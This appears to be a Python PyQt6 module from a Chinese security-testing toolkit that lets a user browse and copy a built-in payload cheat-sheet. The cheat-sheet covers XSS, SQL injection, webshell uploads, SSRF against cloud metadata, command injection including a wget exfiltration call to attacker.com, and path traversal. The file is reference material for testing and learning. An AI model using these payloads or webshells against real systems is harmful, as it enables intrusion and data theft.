"""
Payload 库浏览器 — 分类浏览和搜索安全测试 Payload。

数据源:
  - XSS Payloads (来自 xss_generator)
  - SQLi Payloads (来自 sqli_helper)
  - 文件上传 Payload
  - SSRF Payloads
  - 命令注入 Payloads
  - 路径遍历 Payloads
"""

from __future__ import annotations

from typing import Any, Optional

from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtWidgets import (
    QGroupBox,
    QHBoxLayout,
    QHeaderView,
    QLabel,
    QLineEdit,
    QPushButton,
    QTabWidget,
    QTableWidget,
    QTableWidgetItem,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from core.tool_base import BaseTool, ToolCategory, ToolMeta
from core.tool_registry import register_tool

PAYLOAD_LIBRARY = {
    "XSS": [
        ("基础弹窗", "<script>alert(1)</script>", "HTML 标签"),
        ("IMG 标签", "<img src=x onerror=alert(1)>", "HTML 标签"),
        ("SVG 标签", "<svg onload=alert(1)>", "HTML5 向量"),
        ("Body 事件", "<body onload=alert(1)>", "事件属性"),
        ("Input 自动聚焦", "<input onfocus=alert(1) autofocus>", "事件属性"),
        ("属性逃逸(双引号)", '" onmouseover=alert(1) x="', "属性注入"),
        ("属性逃逸(单引号)", "' onmouseover=alert(1) x='", "属性注入"),
        ("JS 上下文", "</script><script>alert(1)</script>", "JS 逃逸"),
        ("锚点 JS", "javascript:alert(1)", "URL 上下文"),
        ("大小写绕过", "<ScRiPt>alert(1)</sCrIpT>", "WAF 绕过"),
        ("标签拆分", "<scr<script>ipt>alert(1)</scr</script>ipt>", "WAF 绕过"),
        ("HTML 实体", "<img src=x onerror=&#97;lert(1)>", "编码绕过"),
    ],
    "SQL 注入": [
        ("基础测试", "' OR '1'='1", "MySQL"),
        ("注释变体", "' OR 1=1-- -", "MySQL"),
        ("联合查询", "' UNION SELECT 1,2,3-- -", "MySQL"),
        ("报错注入", "' AND updatexml(1,concat(0x7e,version()),1)-- -", "MySQL"),
        ("时间盲注", "' AND SLEEP(5)-- -", "MySQL"),
        ("MSSQL 堆叠", "';EXEC xp_cmdshell('whoami')--", "MSSQL"),
        ("Oracle 报错", "' AND CTXSYS.DRITHSX.SN(1,version())--", "Oracle"),
        ("PG 时间", "';SELECT pg_sleep(5)--", "PostgreSQL"),
        ("空格绕过", "'/**/OR/**/1=1--", "WAF 绕过"),
        ("关键字拆分", "' UNunionION SELselectECT 1,2,3-- -", "WAF 绕过"),
        ("URL 编码", "%27%20OR%201%3D1--", "编码绕过"),
    ],
    "文件上传": [
        ("PHP 一句话", "<?php @eval($_POST['cmd']);?>", "Webshell"),
        ("ASP 一句话", "<%eval request('cmd')%>", "Webshell"),
        ("JSP 一句话", "<%Runtime.getRuntime().exec(request.getParameter('cmd'));%>", "Webshell"),
        ("图片马", "GIF89a<?php @eval($_POST['cmd']);?>", "绕过"),
        (".htaccess", "AddType application/x-httpd-php .jpg", "配置绕过"),
        ("双扩展名", "shell.php.jpg", "扩展名绕过"),
        ("空字节", "shell.php%00.jpg", "扩展名绕过"),
        ("NTFS 流", "shell.php::$DATA", "Windows 特性"),
    ],
    "SSRF": [
        ("AWS 元数据", "http://169.254.169.254/latest/meta-data/", "云服务"),
        ("内部端口扫描", "http://127.0.0.1:6379/", "内网探测"),
        ("File 协议", "file:///etc/passwd", "文件读取"),
        ("Gopher 协议", "gopher://127.0.0.1:6379/_INFO", "Redis"),
        ("DNS 重绑定", "http://7f000001.1ea9d39b.rbndr.us/", "绕过"),
    ],
    "命令注入": [
        ("基础测试", ";id", "Linux"),
        ("管道符", "|cat /etc/passwd", "Linux"),
        ("反引号", "`whoami`", "Linux"),
        ("子 Shell", "$(whoami)", "Linux"),
        ("换行绕过", "%0aid", "绕过"),
        ("Windows 管道", "|whoami", "Windows"),
        ("Windows 连接", "&&whoami", "Windows"),
        ("DNS 外带", ";wget http://attacker.com/$(whoami)", "数据窃取"),
    ],
    "路径遍历": [
        ("基础", "../../etc/passwd", "Linux"),
        ("绝对路径", "/etc/passwd", "Linux"),
        ("深度", "....//....//....//....//etc/passwd", "绕过"),
        ("URL 编码", "..%2F..%2F..%2Fetc%2Fpasswd", "绕过"),
        ("双编码", "..%252F..%252F..%252Fetc%252Fpasswd", "绕过"),
        ("Windows", "..\\..\\..\\windows\\win.ini", "Windows"),
        ("UNC 路径", "\\\\attacker.com\\share\\file", "SMB"),
    ],
}


class PayloadLibraryWidget(QWidget):
    """Payload 库 UI"""

    def __init__(self, parent: Optional[QWidget] = None) -> None:
        super().__init__(parent)
        self._init_ui()

    def _init_ui(self) -> None:
        layout = QVBoxLayout(self)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        # ---- 搜索 ----
        search_row = QHBoxLayout()
        self._search_input = QLineEdit()
        self._search_input.setPlaceholderText("🔍 搜索 Payload (支持名称/类型/数据库)...")
        self._search_input.setStyleSheet(_input_style())
        self._search_input.textChanged.connect(self._on_search)
        search_row.addWidget(self._search_input, stretch=1)
        layout.addLayout(search_row)

        # ---- 分类标签 ----
        self._cat_tabs = QTabWidget()
        self._cat_tabs.setStyleSheet(_tab_style())
        self._tables: dict[str, QTableWidget] = {}

        for cat, payloads in PAYLOAD_LIBRARY.items():
            table = QTableWidget()
            table.setColumnCount(3)
            table.setHorizontalHeaderLabels(["名称", "Payload", "标签"])
            table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
            table.setAlternatingRowColors(True)
            table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
            table.setStyleSheet(_table_style())
            table.itemDoubleClicked.connect(self._on_item_dbl_click)
            self._cat_tabs.addTab(table, f"{cat} ({len(payloads)})")
            self._tables[cat] = table
            self._populate_table(cat, table, payloads)

        layout.addWidget(self._cat_tabs, stretch=1)

        # ---- Payload 详情 ----
        detail_group = QGroupBox("选中 Payload")
        detail_group.setStyleSheet(_group_style())
        dl = QVBoxLayout(detail_group)
        self._detail_edit = QTextEdit()
        self._detail_edit.setReadOnly(True)
        self._detail_edit.setMaximumHeight(100)
        self._detail_edit.setStyleSheet(_textarea_style())
        dl.addWidget(self._detail_edit)

        btn_row = QHBoxLayout()
        copy_btn = QPushButton("📋 复制")
        copy_btn.setStyleSheet(_btn_primary_style())
        copy_btn.clicked.connect(self._copy)
        btn_row.addWidget(copy_btn)
        btn_row.addStretch()
        dl.addLayout(btn_row)

        layout.addWidget(detail_group)

    def _populate_table(
        self, cat: str, table: QTableWidget, payloads: list
    ) -> None:
        table.setRowCount(len(payloads))
        for i, (name, payload, tag) in enumerate(payloads):
            table.setItem(i, 0, QTableWidgetItem(name))
            table.setItem(i, 1, QTableWidgetItem(payload))
            table.setItem(i, 2, QTableWidgetItem(tag))

    def _on_search(self, text: str) -> None:
        query = text.lower()
        for cat, payloads in PAYLOAD_LIBRARY.items():
            table = self._tables.get(cat)
            if not table:
                continue
            filtered = [
                (n, p, t) for n, p, t in payloads
                if query in n.lower() or query in p.lower() or query in t.lower()
            ]
            self._populate_table(cat, table, filtered)
            idx = self._cat_tabs.indexOf(table)
            self._cat_tabs.setTabText(idx, f"{cat} ({len(filtered)})")

    def _on_item_dbl_click(self, item: QTableWidgetItem) -> None:
        row = item.row()
        table = item.tableWidget()
        name = table.item(row, 0).text()
        payload = table.item(row, 1).text()
        tag = table.item(row, 2).text()
        self._detail_edit.setPlainText(f"名称: {name}\n标签: {tag}\n\n{payload}")

    def _copy(self) -> None:
        text = self._detail_edit.toPlainText()
        if text:
            from PyQt6.QtWidgets import QApplication
            QApplication.clipboard().setText(text)


@register_tool
class PayloadLibraryTool(BaseTool):
    """Payload 库浏览器"""

    meta = ToolMeta(
        name="payload_library",
        display_name="Payload 库",
        category=ToolCategory.LEARNING,
        description="多类型安全测试 Payload 库，按 XSS/SQLi/SSRF/上传等分类浏览和搜索",
        icon="📚",
        version="1.0.0",
        keywords=["payload", "xss", "sqli", "ssrf", "上传", "库", "cheatsheet"],
    )

    def __init__(self) -> None:
        super().__init__()
        self._widget: Optional[PayloadLibraryWidget] = None

    def create_widget(self) -> QWidget:
        self._widget = PayloadLibraryWidget()
        return self._widget

    def execute(self, params: dict[str, Any]) -> Any:
        return None

    def validate_params(self, params: dict[str, Any]) -> list[str]:
        return []


def _group_style() -> str:
    return """
        QGroupBox { color: #cdd6f4; font-size: 14px; font-weight: bold;
            border: 1px solid #313244; border-radius: 8px;
            margin-top: 8px; padding-top: 20px; }
        QGroupBox::title { subcontrol-origin: margin; left: 16px; padding: 0 8px; }
    """


def _input_style() -> str:
    return """
        QLineEdit { background-color: #313244; color: #cdd6f4;
            border: 1px solid #45475a; border-radius: 6px;
            padding: 10px 14px; font-size: 14px; }
        QLineEdit:focus { border-color: #89b4fa; }
    """


def _textarea_style() -> str:
    return """
        QTextEdit { background-color: #11111b; color: #cdd6f4;
            border: 1px solid #313244; border-radius: 6px;
            padding: 10px; font-family: Consolas, monospace; font-size: 13px; }
    """


def _btn_primary_style() -> str:
    return """
        QPushButton { background-color: #89b4fa; color: #1e1e2e;
            border: none; border-radius: 6px;
            padding: 8px 20px; font-size: 12px; font-weight: bold; }
        QPushButton:hover { background-color: #74c7ec; }
    """


def _tab_style() -> str:
    return """
        QTabWidget::pane { border: 1px solid #313244; background-color: #1e1e2e; }
        QTabBar::tab { background-color: #181825; color: #a6adc8;
            padding: 6px 14px; font-size: 12px; }
        QTabBar::tab:selected { background-color: #1e1e2e; color: #cdd6f4; }
    """


def _table_style() -> str:
    return """
        QTableWidget { background-color: #11111b; color: #cdd6f4;
            border: 1px solid #313244; border-radius: 6px;
            gridline-color: #313244; font-size: 12px;
            alternate-background-color: #181825; }
        QHeaderView::section { background-color: #1e1e2e; color: #cdd6f4;
            border: 1px solid #313244; padding: 6px 8px; font-weight: bold; }
    """
